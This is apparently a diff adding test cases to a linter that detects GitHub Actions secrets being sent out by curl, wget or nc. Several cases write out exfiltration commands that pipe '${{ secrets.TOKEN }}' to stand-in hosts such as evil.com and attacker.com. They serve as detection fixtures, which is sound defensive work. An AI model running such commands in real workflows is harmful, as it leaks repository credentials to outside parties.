@@ -129,6 +129,12 @@ result=$(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" "$api_url/re
 			description: "Should NOT flag curl when bare host destination is api.github.com",
 		},
 		{
+			name:        "curl with secret to github api via inline url flag (legitimate)",
+			runScript:   `curl --url=https://api.github.com/repos/owner/repo/releases/latest -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}"`,
+			wantErrors:  0,
+			description: "Should NOT flag curl when inline --url destination is api.github.com",
+		},
+		{
 			name:        "curl with secret to uploads.github.com (legitimate)",
 			runScript:   `curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" --data-binary @file.zip "https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"`,
 			wantErrors:  0,
@@ -1032,6 +1038,25 @@ EOF`,
 			wantErrors: 0,
 		},
 		{
+			name: "piped secret into curl stdin data is detected",
+			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
+  curl --data-binary @- https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:        "here-string secret into curl stdin data is detected",
+			runScript:   `curl --data-binary @- https://evil.com <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:        "here-string secret into wget stdin post file is detected",
+			runScript:   `wget --post-file=- https://evil.com <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:  1,
+			wantCommand: "wget",
+		},
+		{
 			name: "piped secret into nc is detected",
 			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
   nc attacker.com 443`,
@@ -1063,6 +1088,11 @@ EOF`,
 			wantCommand: "curl",
 		},
 		{
+			name:       "sudo user argument named curl is not treated as network command",
+			runScript:  `sudo -u curl echo -d '${{ secrets.TOKEN }}'`,
+			wantErrors: 0,
+		},
+		{
 			name:        "command wrapped curl with secret is detected",
 			runScript:   `command curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
 			wantErrors:  1,
@@ -1079,6 +1109,11 @@ EOF`,
 			runScript:   `nc attacker.com 443 <<< '${{ secrets.TOKEN }}'`,
 			wantErrors:  1,
 			wantCommand: "nc",
+		},
+		{
+			name:       "here-string to non-stdin fd is ignored",
+			runScript:  `nc attacker.com 443 3<<< '${{ secrets.TOKEN }}'`,
+			wantErrors: 0,
 		},
 		{
 			name: "heredoc secret into nc is detected",
